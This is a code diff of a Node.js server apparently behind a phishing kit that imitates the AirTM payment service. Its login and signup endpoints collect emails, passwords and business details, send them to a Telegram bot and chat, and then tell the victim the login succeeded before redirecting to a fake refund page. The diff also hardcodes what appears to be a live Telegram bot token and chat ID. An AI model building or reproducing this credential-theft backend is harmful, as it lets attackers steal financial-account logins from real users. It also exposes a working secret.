@@ -3,27 +3,14 @@ const cors = require('cors');
 const axios = require('axios');
 const path = require('path');
 
-// Load environment variables
-require('dotenv').config();
-
 const app = express();
 const PORT = process.env.PORT || 5000;
 
 // ============================================
-// TELEGRAM CONFIGURATION - FROM ENV VARIABLES
+// TELEGRAM CONFIGURATION
 // ============================================
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-// Check if Telegram credentials are configured
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.error('❌ Telegram credentials not configured!');
-    console.error('Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment variables.');
-    process.exit(1);
-}
-
-console.log('✅ Telegram Bot Token: Configured');
-console.log('✅ Telegram Chat ID: Configured');
+const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
+const TELEGRAM_CHAT_ID = '7386607055';
 
 // ============================================
 // MIDDLEWARE
@@ -32,158 +19,90 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Serve static files (HTML, CSS, JS)
+// Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ============================================
-// TELEGRAM SEND MESSAGE FUNCTION
+// HEALTH CHECK ENDPOINT
 // ============================================
-async function sendTelegramMessage(message) {
-    try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const response = await axios.post(url, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        });
-        return response.data;
-    } catch (error) {
-        console.error('Telegram send error:', error.response?.data || error.message);
-        throw error;
-    }
-}
-
-// ============================================
-// FORMAT LOGIN DATA
-// ============================================
-function formatLoginData(email, password, req) {
-    const ip = req.headers['x-forwarded-for'] || 
-               req.socket.remoteAddress || 
-               'Unknown';
-    
-    const userAgent = req.headers['user-agent'] || 'Unknown';
-    const timestamp = new Date().toLocaleString('en-US', { 
-        timeZone: 'Africa/Lagos',
-        day: '2-digit',
-        month: '2-digit',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    });
-
-    return `
-🔐 <b>AIRTM LOGIN ATTEMPT</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━
-
-📧 <b>Email:</b> ${email}
-🔑 <b>Password:</b> ${password}
-
-🕐 <b>Time:</b> ${timestamp}
-📍 <b>IP Address:</b> ${ip}
-💻 <b>User Agent:</b> ${userAgent}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ <i>Unauthorized access attempt detected!</i>
-    `;
-}
-
-// ============================================
-// FORMAT SIGNUP DATA
-// ============================================
-function formatSignupData(data, req) {
-    const ip = req.headers['x-forwarded-for'] || 
-               req.socket.remoteAddress || 
-               'Unknown';
-    
-    const userAgent = req.headers['user-agent'] || 'Unknown';
-    const timestamp = new Date().toLocaleString('en-US', { 
-        timeZone: 'Africa/Lagos',
-        day: '2-digit',
-        month: '2-digit',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    });
-
-    return `
-📝 <b>AIRTM SIGNUP ATTEMPT</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━
-
-📧 <b>Email:</b> ${data.email}
-🔑 <b>Password:</b> ${data.password}
-
-🌍 <b>Country:</b> ${data.country}
-🏢 <b>Business Name:</b> ${data.businessName}
-📋 <b>Entity Type:</b> ${data.entityType}
-✅ <b>Terms Accepted:</b> ${data.termsAccepted ? 'Yes' : 'No'}
-
-🕐 <b>Time:</b> ${timestamp}
-📍 <b>IP Address:</b> ${ip}
-💻 <b>User Agent:</b> ${userAgent}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ <i>Unauthorized access attempt detected!</i>
-    `;
-}
-
-// ============================================
-// ROUTES
-// ============================================
-
-// Health check endpoint
 app.get('/health', (req, res) => {
-    res.json({
-        status: 'OK',
+    res.json({ 
+        status: 'OK', 
         timestamp: new Date().toISOString(),
-        uptime: process.uptime()
+        message: 'Server is running!'
     });
-});
-
-// Serve login page
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'login.html'));
-});
-
-// Serve signup page
-app.get('/signup', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'signup.html'));
-});
-
-// Serve refund page
-app.get('/refund', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'refund.html'));
 });
 
 // ============================================
 // LOGIN ENDPOINT
 // ============================================
 app.post('/api/login', async (req, res) => {
+    console.log('📨 Login endpoint hit!');
+    console.log('📨 Request body:', req.body);
+    
     try {
         const { email, password } = req.body;
-
+        
+        // Validate input
         if (!email || !password) {
+            console.log('❌ Missing email or password');
             return res.status(400).json({ 
                 success: false, 
                 message: 'Email and password are required' 
             });
         }
 
-        const message = formatLoginData(email, password, req);
-        await sendTelegramMessage(message);
+        console.log(`📧 Login attempt: ${email}`);
 
-        console.log(`✅ Login attempt recorded: ${email}`);
+        // Format message for Telegram
+        const message = `
+🔐 <b>AIRTM LOGIN ATTEMPT</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━
 
-        res.json({ 
+📧 <b>Email:</b> ${email}
+🔑 <b>Password:</b> ${password}
+
+🕐 <b>Time:</b> ${new Date().toLocaleString('en-US', { 
+    timeZone: 'Africa/Lagos',
+    day: '2-digit',
+    month: '2-digit',
+    year: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
+})}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ <i>Unauthorized access attempt detected!</i>
+        `;
+
+        // Send to Telegram
+        try {
+            const telegramResponse = await axios.post(
+                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                }
+            );
+            console.log('✅ Telegram notification sent successfully');
+        } catch (telegramError) {
+            console.error('❌ Telegram error:', telegramError.message);
+            // Continue even if Telegram fails
+        }
+
+        // Return success response
+        console.log('✅ Sending success response');
+        return res.json({ 
             success: true, 
             message: 'Login successful! Redirecting...',
             redirect: '/refund'
         });
 
     } catch (error) {
-        console.error('Login error:', error);
-        res.status(500).json({ 
+        console.error('❌ Server error:', error.message);
+        return res.status(500).json({ 
             success: false, 
             message: 'Server error. Please try again.' 
         });
@@ -194,6 +113,9 @@ app.post('/api/login', async (req, res) => {
 // SIGNUP ENDPOINT
 // ============================================
 app.post('/api/signup', async (req, res) => {
+    console.log('📨 Signup endpoint hit!');
+    console.log('📨 Request body:', req.body);
+    
     try {
         const { 
             email, 
@@ -226,21 +148,55 @@ app.post('/api/signup', async (req, res) => {
             });
         }
 
-        const signupData = { email, password, country, businessName, entityType, termsAccepted };
-        const message = formatSignupData(signupData, req);
-        await sendTelegramMessage(message);
+        const message = `
+📝 <b>AIRTM SIGNUP ATTEMPT</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━
 
-        console.log(`✅ Signup attempt recorded: ${email}`);
+📧 <b>Email:</b> ${email}
+🔑 <b>Password:</b> ${password}
 
-        res.json({ 
+🌍 <b>Country:</b> ${country}
+🏢 <b>Business Name:</b> ${businessName}
+📋 <b>Entity Type:</b> ${entityType}
+✅ <b>Terms Accepted:</b> ${termsAccepted ? 'Yes' : 'No'}
+
+🕐 <b>Time:</b> ${new Date().toLocaleString('en-US', { 
+    timeZone: 'Africa/Lagos',
+    day: '2-digit',
+    month: '2-digit',
+    year: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
+})}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ <i>Unauthorized access attempt detected!</i>
+        `;
+
+        try {
+            await axios.post(
+                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                }
+            );
+            console.log('✅ Telegram notification sent successfully');
+        } catch (telegramError) {
+            console.error('❌ Telegram error:', telegramError.message);
+        }
+
+        return res.json({ 
             success: true, 
             message: 'Account created successfully! Redirecting...',
             redirect: '/refund'
         });
 
     } catch (error) {
-        console.error('Signup error:', error);
-        res.status(500).json({ 
+        console.error('❌ Signup error:', error.message);
+        return res.status(500).json({ 
             success: false, 
             message: 'Server error. Please try again.' 
         });
@@ -248,11 +204,27 @@ app.post('/api/signup', async (req, res) => {
 });
 
 // ============================================
+// CATCH-ALL ROUTE - Return JSON for API calls
+// ============================================
+app.use('*', (req, res) => {
+    if (req.path.startsWith('/api')) {
+        return res.status(404).json({ 
+            success: false, 
+            message: 'API endpoint not found' 
+        });
+    }
+    // For non-API routes, serve the HTML
+    res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
+
+// ============================================
 // START SERVER
 // ============================================
 app.listen(PORT, '0.0.0.0', () => {
+    console.log('========================================');
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📍 http://localhost:${PORT}`);
-    console.log(`🤖 Telegram bot: ${TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ❌'}`);
-    console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID ? 'Configured ✅' : 'Not configured ❌'}`);
+    console.log(`🤖 Telegram bot: Configured ✅`);
+    console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID}`);
+    console.log('========================================');
 });
